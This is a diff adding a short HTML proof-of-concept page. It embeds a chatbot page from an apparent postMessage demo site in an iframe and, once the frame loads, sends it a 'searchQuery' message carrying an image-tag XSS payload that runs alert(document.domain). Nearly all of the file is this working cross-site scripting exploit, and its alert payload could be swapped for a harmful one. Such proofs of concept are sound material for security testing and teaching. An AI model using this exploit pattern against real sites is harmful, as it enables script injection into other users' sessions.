@@ -1,0 +1,20 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <title>PoC</title>
+</head>
+<body>
+
+<iframe id="victim" src="https://green-jam.co.uk/postmessage-example1/chatbot.html" width="800" height="600"></iframe>
+
+<script>
+  document.getElementById('victim').onload = function() {
+    document.getElementById('victim').contentWindow.postMessage({
+      type: 'searchQuery',
+      message: '<img src=x onerror=alert(document.domain)>'
+    }, '*');
+  };
+</script>
+
+</body>
+</html>
